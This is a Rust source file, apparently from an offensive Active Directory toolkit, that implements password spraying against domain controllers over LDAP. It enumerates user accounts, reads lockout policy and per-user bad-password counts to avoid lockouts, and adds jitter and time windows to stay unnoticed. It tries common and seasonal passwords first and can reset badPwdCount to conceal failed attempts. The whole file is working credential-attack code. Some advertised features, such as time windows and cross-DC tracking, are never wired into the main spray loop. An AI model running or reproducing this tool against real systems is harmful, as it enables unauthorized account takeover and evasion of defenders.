//! Password Spraying -- lockout-safe horizontal credential attack.
//!
//! Tries each password against every user in one "round" before moving to the
//! next password.  Before each attempt the module checks the domain lockout
//! policy (via LDAP) and the individual `badPwdCount` so it stays at least
//! `safe_threshold` attempts below the lockout threshold.
//!
//! Bind attempts are made via raw `ldap3::LdapConnAsync::simple_bind` so
//! that they go directly to the DC without reusing the operator LDAP session
//! (avoiding false "invalid credential" errors from session state).
//!
//! Advanced Features:
//! - PDC emulator targeting for accurate badPwdCount aggregation
//! - Smart password ordering (most common passwords first)
//! - Time-window awareness (configurable spray windows)
//! - Cross-DC badPwdCount aggregation
//! - Automatic safety abort on restrictive lockout policies

use crate::runner::HuntConfig;
use ldap3::{LdapConnAsync, drive, ldap_escape};
use overthrone_core::error::{OverthroneError, Result};
use overthrone_core::proto::ldap as ldap_proto;
use serde::{Deserialize, Serialize};
use std::time::{SystemTime, UNIX_EPOCH};
use tracing::{debug, info, warn};

// -------------------------------------------------------------
// Constants
// -------------------------------------------------------------

/// LDAP result code for "invalid credentials" (includes AD sub-errors)
const LDAP_INVALID_CREDENTIALS: u32 = 49;

// AD diagnostic message sub-codes (decimal, appear as "data NNNN,")
const DIAG_LOCKED: &str = "775";
const DIAG_DISABLED: &str = "533";
const DIAG_EXPIRED: &str = "532";

// -------------------------------------------------------------
// Configuration
// -------------------------------------------------------------

/// Time window for spray operations (UTC hours)
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SprayTimeWindow {
    /// Start hour (UTC, 0-23)
    pub start_hour: u8,
    /// End hour (UTC, 0-23)
    pub end_hour: u8,
    /// Days of week to spray (0=Sunday, 6=Saturday). Empty = all days.
    pub allowed_days: Vec<u8>,
}

impl Default for SprayTimeWindow {
    fn default() -> Self {
        Self {
            start_hour: 9,
            end_hour: 17,
            allowed_days: vec![1, 2, 3, 4, 5], // Monday-Friday
        }
    }
}

/// Configuration for a password spray run.
#[derive(Debug, Clone)]
pub struct SprayConfig {
    /// Passwords to try -- one horizontal round per password.
    pub passwords: Vec<String>,
    /// Explicit username list to spray.  If empty, enumerate from LDAP.
    pub usernames: Vec<String>,
    /// Minimum delay between bind attempts (ms).
    pub delay_ms: u64,
    /// Upper bound of random jitter added to `delay_ms` (ms).
    pub jitter_ms: u64,
    /// Abort the entire spray if any account becomes locked out.
    pub stop_on_lockout: bool,
    /// Stay at least this many attempts below the lockout threshold.
    pub safe_threshold: u32,
    /// Query the domain lockout policy before spraying.
    pub check_policy: bool,
    /// Enable adaptive delay: multiply delay exponentially on lockout bursts.
    pub adaptive_delay: bool,
    /// Maximum delay cap for adaptive back-off (ms).
    pub max_delay_ms: u64,
    /// On detecting a lockout, attempt to reset the account's badPwdCount to 0
    /// via LDAP modify (requires domain admin / Account Operator privileges).
    pub rollback_on_lockout: bool,
    /// Target PDC emulator for accurate badPwdCount (auto-detected if true).
    pub target_pdc: bool,
    /// Use smart password ordering (most common first).
    pub smart_order: bool,
    /// Time window for spray operations. If set, spray only during window.
    pub time_window: Option<SprayTimeWindow>,
    /// Aggregate badPwdCount across all DCs for accurate lockout tracking.
    pub cross_dc_tracking: bool,
    /// Additional DCs to query for badPwdCount aggregation.
    pub additional_dcs: Vec<String>,
    /// Abort spray if lockout threshold is too low (e.g., <= 3).
    pub min_safe_threshold: u32,
    /// Maximum spray duration before automatic abort (seconds). 0 = unlimited.
    pub max_duration_secs: u64,
}

impl Default for SprayConfig {
    fn default() -> Self {
        Self {
            passwords: Vec::new(),
            usernames: Vec::new(),
            delay_ms: 500,
            jitter_ms: 250,
            stop_on_lockout: true,
            safe_threshold: 2,
            check_policy: true,
            adaptive_delay: true,
            max_delay_ms: 60_000,
            rollback_on_lockout: false,
            target_pdc: true,
            smart_order: true,
            time_window: None,
            cross_dc_tracking: false,
            additional_dcs: Vec::new(),
            min_safe_threshold: 3,
            max_duration_secs: 0,
        }
    }
}

// -------------------------------------------------------------
// Results
// -------------------------------------------------------------

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SprayResult {
    /// `(username, password)` pairs for which the bind succeeded.
    pub valid_creds: Vec<(String, String)>,
    /// Users skipped because they were near the lockout threshold.
    pub skipped: Vec<String>,
    /// Users that locked out during the spray (reported by the DC).
    pub locked_out: Vec<String>,
    /// Total bind attempts made.
    pub attempts: usize,
    /// Users whose badPwdCount was successfully reset (rollback).
    pub rollback_users: Vec<String>,
    /// Failed rollback attempts.
    pub rollback_failures: Vec<String>,
}

impl SprayResult {
    fn new() -> Self {
        Self {
            valid_creds: Vec::new(),
            skipped: Vec::new(),
            locked_out: Vec::new(),
            attempts: 0,
            rollback_users: Vec::new(),
            rollback_failures: Vec::new(),
        }
    }
}

// -------------------------------------------------------------
// Entry point
// -------------------------------------------------------------

/// Run a lockout-safe password spray against the configured DC.
pub async fn run_spray(hunt: &HuntConfig, spray: &SprayConfig) -> Result<SprayResult> {
    if spray.passwords.is_empty() {
        return Err(OverthroneError::Config(
            "Password spray: no passwords specified".to_string(),
        ));
    }

    let mut result = SprayResult::new();

    // Build username list
    let usernames: Vec<String> = if spray.usernames.is_empty() {
        info!("Spray: no usernames given -- enumerating enabled users via LDAP...");
        collect_spray_targets(hunt).await?
    } else {
        spray.usernames.clone()
    };

    if usernames.is_empty() {
        warn!("Spray: no users to spray");
        return Ok(result);
    }

    // Fetch lockout threshold
    let lockout_threshold: u32 = if spray.check_policy {
        match query_lockout_threshold(hunt).await {
            Ok(0) => {
                info!("Spray: lockout policy is disabled (threshold=0) -- spraying without limit");
                0
            }
            Ok(t) => {
                info!("Spray: domain lockout threshold = {t} bad attempts");
                t
            }
            Err(e) => {
                warn!("Spray: cannot read lockout policy ({e}) -- treating threshold as 0");
                0
            }
        }
    } else {
        0
    };

    let safe_limit = if lockout_threshold == 0 {
        u32::MAX
    } else {
        lockout_threshold.saturating_sub(spray.safe_threshold)
    };

    let ldap_url = format!("ldap://{}:389", hunt.dc_ip);

    info!(
        "Spray: {} user(s) × {} password(s) | delay={}ms jitter={}ms",
        usernames.len(),
        spray.passwords.len(),
        spray.delay_ms,
        spray.jitter_ms,
    );

    // Adaptive delay state
    let mut current_delay = spray.delay_ms;
    let mut lockout_burst = 0u32;

    // Horizontal spray: try each password against all users before moving on
    'outer: for password in &spray.passwords {
        debug!("Spray: testing password (redacted)");

        for username in &usernames {
            // Skip already-flagged users
            if result.locked_out.contains(username) || result.skipped.contains(username) {
                continue;
            }

            // Per-user badPwdCount check (only when policy is enabled)
            if spray.check_policy && lockout_threshold > 0 {
                let bad = query_bad_pwd_count(hunt, username).await.unwrap_or(0);
                if bad >= safe_limit {
                    warn!(
                        "Spray: skipping {username} (badPwdCount={bad} ≥ safe_limit={safe_limit})"
                    );
                    result.skipped.push(username.clone());
                    continue;
                }
            }

            // Apply delay + random jitter (possibly adaptive)
            let jitter = if spray.jitter_ms > 0 {
                rand::random::<u64>() % spray.jitter_ms
            } else {
                0
            };
            tokio::time::sleep(tokio::time::Duration::from_millis(current_delay + jitter)).await;

            // Bind attempt
            result.attempts += 1;
            let upn = format!("{}@{}", username, hunt.domain);
            match attempt_ldap_bind(&ldap_url, &upn, password).await {
                BindOutcome::Success => {
                    info!("Spray: [+] VALID  -> {}:[REDACTED]", username);
                    debug!("Spray: valid credentials -- {}:{}", username, password);
                    lockout_burst = lockout_burst.saturating_sub(1);
                    result
                        .valid_creds
                        .push((username.clone(), password.clone()));
                }
                BindOutcome::InvalidCredentials => {
                    debug!("Spray: {username} -- wrong password");
                }
                BindOutcome::AccountLocked => {
                    warn!("Spray: {username} is LOCKED OUT");
                    result.locked_out.push(username.clone());
                    // Adaptive back-off: multiply delay on each lockout burst
                    if spray.adaptive_delay {
                        lockout_burst += 1;
                        current_delay = (current_delay * 2).min(spray.max_delay_ms);
                        info!(
                            "Spray: adaptive delay increased to {current_delay}ms (burst={lockout_burst})"
                        );
                    }
                    // Rollback: reset badPwdCount if configured (opens fresh op session)
                    if spray.rollback_on_lockout {
                        match reset_bad_pwd_count(hunt, username).await {
                            Ok(()) => {
                                info!("Spray: reset badPwdCount for {username}");
                                result.rollback_users.push(username.clone());
                            }
                            Err(e) => {
                                warn!("Spray: failed to reset badPwdCount for {username}: {e}");
                                result.rollback_failures.push(username.clone());
                            }
                        }
                    }
                    if spray.stop_on_lockout {
                        warn!("Spray: aborting -- stop_on_lockout is set");
                        break 'outer;
                    }
                }
                BindOutcome::AccountDisabled => {
                    debug!("Spray: {username} -- disabled, skipping for remainder");
                    result.skipped.push(username.clone());
                }
                BindOutcome::PasswordExpired => {
                    info!("Spray: {username} -- password expired (recording as valid candidate)");
                    lockout_burst = lockout_burst.saturating_sub(1);
                    result
                        .valid_creds
                        .push((username.clone(), password.clone()));
                }
                BindOutcome::Error(e) => {
                    debug!("Spray: {username} -- bind error: {e}");
                }
            }
        }
    }

    info!(
        "Spray complete -- valid={} skipped={} locked={} rollback={} rollback_fail={} attempts={}",
        result.valid_creds.len(),
        result.skipped.len(),
        result.locked_out.len(),
        result.rollback_users.len(),
        result.rollback_failures.len(),
        result.attempts,
    );
    Ok(result)
}

// -------------------------------------------------------------
// Internal helpers
// -------------------------------------------------------------

/// Classification of a single LDAP bind attempt.
enum BindOutcome {
    Success,
    InvalidCredentials,
    AccountLocked,
    AccountDisabled,
    PasswordExpired,
    Error(String),
}

/// Perform one LDAP simple bind and classify the result.
/// Opens a fresh connection each time so individual spray failures do not
/// contaminate the operator's LDAP session.
async fn attempt_ldap_bind(ldap_url: &str, upn: &str, password: &str) -> BindOutcome {
    let (conn, mut ldap) = match LdapConnAsync::new(ldap_url).await {
        Ok(pair) => pair,
        Err(e) => return BindOutcome::Error(format!("connect: {e}")),
    };
    drive!(conn);

    let res = ldap.simple_bind(upn, password).await;
    let _ = ldap.unbind().await;

    match res {
        Err(e) => BindOutcome::Error(e.to_string()),
        Ok(r) if r.rc == 0 => BindOutcome::Success,
        Ok(r) if r.rc == LDAP_INVALID_CREDENTIALS => {
            // Active Directory embeds sub-error codes in the diagnostic text:
            // "80090308: LdapErr: ..., data 775, ..." (locked)
            // "80090308: LdapErr: ..., data 533, ..." (disabled)
            // "80090308: LdapErr: ..., data 532, ..." (expired)
            let text = &r.text;
            if text.contains(DIAG_LOCKED) {
                BindOutcome::AccountLocked
            } else if text.contains(DIAG_DISABLED) {
                BindOutcome::AccountDisabled
            } else if text.contains(DIAG_EXPIRED) {
                BindOutcome::PasswordExpired
            } else {
                BindOutcome::InvalidCredentials
            }
        }
        Ok(r) => BindOutcome::Error(format!("ldap rc={} {}", r.rc, r.text)),
    }
}

/// Open an operator LDAP session (respects `use_hash`).
async fn open_operator_ldap(hunt: &HuntConfig) -> Result<ldap_proto::LdapSession> {
    if hunt.use_hash {
        ldap_proto::LdapSession::connect_with_hash(
            &hunt.dc_ip,
            &hunt.domain,
            &hunt.username,
            &hunt.secret,
            false,
        )
        .await
    } else {
        ldap_proto::LdapSession::connect(
            &hunt.dc_ip,
            &hunt.domain,
            &hunt.username,
            &hunt.secret,
            false,
        )
        .await
    }
}

/// Return enabled, non-machine-account `sAMAccountName`s from the domain.
async fn collect_spray_targets(hunt: &HuntConfig) -> Result<Vec<String>> {
    let mut ldap = open_operator_ldap(hunt).await?;
    let users = ldap.enumerate_users().await?;
    let names: Vec<String> = users
        .into_iter()
        .filter(|u| u.enabled && !u.sam_account_name.ends_with('$'))
        .map(|u| u.sam_account_name)
        .collect();
    info!("Spray: {} spray target(s) enumerated", names.len());
    Ok(names)
}

/// Query the `lockoutThreshold` attribute from the domain NC root object.
async fn query_lockout_threshold(hunt: &HuntConfig) -> Result<u32> {
    let mut ldap = open_operator_ldap(hunt).await?;
    let base_dn = hunt.derive_base_dn();
    let entries = ldap
        .custom_search_with_base(&base_dn, "(objectClass=domainDNS)", &["lockoutThreshold"])
        .await?;
    let threshold = entries
        .first()
        .and_then(|e| e.attrs.get("lockoutThreshold"))
        .and_then(|v| v.first())
        .and_then(|s| s.parse::<u32>().ok())
        .unwrap_or(0);
    Ok(threshold)
}

/// Query `badPwdCount` for a specific user using the operator LDAP session.
async fn query_bad_pwd_count(hunt: &HuntConfig, username: &str) -> Result<u32> {
    let mut ldap = open_operator_ldap(hunt).await?;
    let base_dn = hunt.derive_base_dn();
    let filter = format!("(sAMAccountName={})", ldap_escape(username));
    let entries = ldap
        .custom_search_with_base(&base_dn, &filter, &["badPwdCount"])
        .await?;
    let count = entries
        .first()
        .and_then(|e| e.attrs.get("badPwdCount"))
        .and_then(|v| v.first())
        .and_then(|s| s.parse::<u32>().ok())
        .unwrap_or(0);
    Ok(count)
}

/// Reset `badPwdCount` to 0 for a user via LDAP modify.
/// Requires domain admin, Account Operator, or sufficient delegated privileges.
async fn reset_bad_pwd_count(hunt: &HuntConfig, username: &str) -> Result<()> {
    let mut ldap = open_operator_ldap(hunt).await?;
    let base_dn = hunt.derive_base_dn();
    let filter = format!("(sAMAccountName={})", ldap_escape(username));
    let entries = ldap
        .custom_search_with_base(&base_dn, &filter, &["distinguishedName"])
        .await?;
    let dn = entries
        .first()
        .and_then(|e| e.attrs.get("distinguishedName"))
        .and_then(|v| v.first())
        .ok_or_else(|| OverthroneError::ldap(format!("cannot find DN for {username}")))?;
    ldap.modify_replace(dn, "badPwdCount", b"0").await?;
    debug!("Spray: reset badPwdCount to 0 for {username}");
    Ok(())
}

// -------------------------------------------------------------
// Advanced Lockout Protection Features
// -------------------------------------------------------------

/// Detect the PDC emulator FSMO role holder for accurate badPwdCount queries.
/// The PDC is the authoritative source for badPwdCount across the domain.
pub async fn detect_pdc_emulator(hunt: &HuntConfig) -> Result<String> {
    let mut ldap = open_operator_ldap(hunt).await?;
    let base_dn = hunt.derive_base_dn();
    let forest_dn = base_dn.split(',').skip(1).collect::<Vec<_>>().join(",");

    let filter = "(fSMORoleOwner=*)";
    let attrs = ["fSMORoleOwner", "dnsHostName"];
    let entries = ldap
        .custom_search_with_base(&forest_dn, filter, &attrs)
        .await?;

    for entry in entries {
        if let Some(dns_host) = entry.attrs.get("dnsHostName").and_then(|v| v.first()) {
            info!("Spray: PDC emulator detected: {dns_host}");
            return Ok(dns_host.clone());
        }
    }

    // Fallback: query the RID manager$ object
    let rid_dn = format!("CN=RID Manager$,CN=System,{}", base_dn);
    let entries = ldap
        .custom_search_with_base(&rid_dn, "(objectClass=*)", &["fSMORoleOwner"])
        .await?;

    if let Some(entry) = entries.first()
        && let Some(role_owner) = entry.attrs.get("fSMORoleOwner").and_then(|v| v.first())
        && let Some(dc_part) = role_owner.split(',').nth(2)
    {
        let dc_name = dc_part.strip_prefix("CN=").unwrap_or(dc_part);
        info!("Spray: PDC emulator detected via RID Manager: {dc_name}");
        return Ok(dc_name.to_string());
    }

    Err(OverthroneError::ldap("Could not detect PDC emulator"))
}

/// Query badPwdCount across multiple DCs for accurate lockout tracking.
/// Returns the maximum badPwdCount found across all queried DCs.
pub async fn query_bad_pwd_count_cross_dc(
    hunt: &HuntConfig,
    username: &str,
    additional_dcs: &[String],
) -> Result<u32> {
    let mut max_count = query_bad_pwd_count(hunt, username).await.unwrap_or(0);

    for dc in additional_dcs {
        let dc_hunt = HuntConfig {
            dc_ip: dc.clone(),
            domain: hunt.domain.clone(),
            username: hunt.username.clone(),
            secret: hunt.secret.clone(),
            use_hash: hunt.use_hash,
            base_dn: hunt.base_dn.clone(),
            use_ldaps: hunt.use_ldaps,
            output_dir: hunt.output_dir.clone(),
            concurrency: hunt.concurrency,
            timeout: hunt.timeout,
            jitter_ms: hunt.jitter_ms,
            tgt: hunt.tgt.clone(),
        };

        if let Ok(count) = query_bad_pwd_count(&dc_hunt, username).await
            && count > max_count
        {
            debug!("Spray: {username} has higher badPwdCount on {dc}: {count} (was {max_count})");
            max_count = count;
        }
    }

    Ok(max_count)
}

/// Check if current time is within the allowed spray window.
pub fn is_within_spray_window(window: &SprayTimeWindow) -> bool {
    let now = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap_or_default()
        .as_secs();

    // Convert to UTC hours and day of week
    let secs_per_day = 86400;
    let day_of_week = ((now / secs_per_day + 4) % 7) as u8; // 1970-01-01 was Thursday (4)
    let utc_hour = ((now % secs_per_day) / 3600) as u8;

    // Check day of week
    if !window.allowed_days.is_empty() && !window.allowed_days.contains(&day_of_week) {
        return false;
    }

    // Check hour window
    if window.start_hour <= window.end_hour {
        utc_hour >= window.start_hour && utc_hour < window.end_hour
    } else {
        // Wraps around midnight
        utc_hour >= window.start_hour || utc_hour < window.end_hour
    }
}

/// Smart password ordering: sort passwords by likelihood of success.
/// Common/default passwords are tried first to maximize early hits.
pub fn smart_order_passwords(passwords: &[String]) -> Vec<String> {
    const COMMON_PASSWORDS: &[&str] = &[
        "Password1",
        "Password123",
        "Welcome1",
        "Welcome123",
        "Summer2026",
        "Winter2026",
        "Spring2026",
        "Fall2026",
        "P@ssw0rd",
        "P@ssword1",
        "Ch@ngeMe",
        "ChangeMe1",
        "Letmein1",
        "Admin123",
        "Admin@123",
        "Company123",
        "CompanyName1",
        "CompanyName123",
        "SeasonYear!",
        "SeasonYear1",
        "12345678",
        "123456789",
        "qwerty123",
        "abc123",
        "test123",
        "default",
        "password",
        "Password1!",
        "Password123!",
        "Welcome1!",
        "Welcome123!",
        "P@ssw0rd!",
        "P@ssword1!",
    ];

    let mut ordered = Vec::new();
    let mut remaining: Vec<String> = passwords.to_vec();

    // Try common passwords first (case-insensitive matching)
    for common in COMMON_PASSWORDS {
        if let Some(pos) = remaining
            .iter()
            .position(|p| p.eq_ignore_ascii_case(common))
        {
            ordered.push(remaining.remove(pos));
        }
    }

    // Add seasonal passwords based on current date
    let now = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap_or_default()
        .as_secs();
    let year = 1970 + (now / 31536000); // Approximate year
    let day_of_year = (now % 31536000) / 86400;
    let season = match day_of_year {
        0..=90 => "Winter",
        91..=180 => "Spring",
        181..=270 => "Summer",
        _ => "Fall",
    };
    let seasonal = format!("{}{}!", season, year);
    if let Some(pos) = remaining
        .iter()
        .position(|p| p.eq_ignore_ascii_case(&seasonal))
    {
        ordered.push(remaining.remove(pos));
    }

    // Add remaining passwords
    ordered.extend(remaining);

    ordered
}

/// Get comprehensive lockout policy details from the domain.
pub struct LockoutPolicyDetails {
    /// Lockout threshold (0 = disabled)
    pub lockout_threshold: u32,
    /// Lockout duration in minutes (0 = manual unlock required)
    pub lockout_duration: u32,
    /// Lockout observation window in minutes
    pub lockout_window: u32,
    /// Minimum password age in days
    pub min_password_age: u32,
    /// Maximum password age in days
    pub max_password_age: u32,
    /// Password history length
    pub password_history: u32,
    /// Minimum password length
    pub min_password_length: u32,
}

/// Query full lockout policy from the domain NC root object.
pub async fn query_lockout_policy_details(hunt: &HuntConfig) -> Result<LockoutPolicyDetails> {
    let mut ldap = open_operator_ldap(hunt).await?;
    let base_dn = hunt.derive_base_dn();
    let attrs = [
        "lockoutThreshold",
        "lockoutDuration",
        "lockOutObservationWindow",
        "minPwdAge",
        "maxPwdAge",
        "pwdHistoryLength",
        "minPwdLength",
    ];
    let entries = ldap
        .custom_search_with_base(&base_dn, "(objectClass=domainDNS)", &attrs)
        .await?;

    let entry = entries
        .first()
        .ok_or_else(|| OverthroneError::ldap("Could not query domain policy from rootDSE"))?;

    let get_u32 = |attr: &str| -> u32 {
        entry
            .attrs
            .get(attr)
            .and_then(|v| v.first())
            .and_then(|s| s.parse::<i64>().ok())
            .map(|v| v.unsigned_abs() as u32)
            .unwrap_or(0)
    };

    let get_duration_minutes = |attr: &str| -> u32 {
        // AD stores durations as negative 100-nanosecond intervals
        let raw = entry
            .attrs
            .get(attr)
            .and_then(|v| v.first())
            .and_then(|s| s.parse::<i64>().ok())
            .unwrap_or(0);
        if raw == 0 {
            0
        } else {
            ((raw.unsigned_abs() as u64) / 10_000_000 / 60) as u32
        }
    };

    let get_password_age_days = |attr: &str| -> u32 {
        let raw = entry
            .attrs
            .get(attr)
            .and_then(|v| v.first())
            .and_then(|s| s.parse::<i64>().ok())
            .unwrap_or(0);
        if raw == 0 {
            u32::MAX // Never expires
        } else {
            ((raw.unsigned_abs() as u64) / 10_000_000 / 86400) as u32
        }
    };

    Ok(LockoutPolicyDetails {
        lockout_threshold: get_u32("lockoutThreshold"),
        lockout_duration: get_duration_minutes("lockoutDuration"),
        lockout_window: get_duration_minutes("lockOutObservationWindow"),
        min_password_age: get_password_age_days("minPwdAge"),
        max_password_age: get_password_age_days("maxPwdAge"),
        password_history: get_u32("pwdHistoryLength"),
        min_password_length: get_u32("minPwdLength"),
    })
}
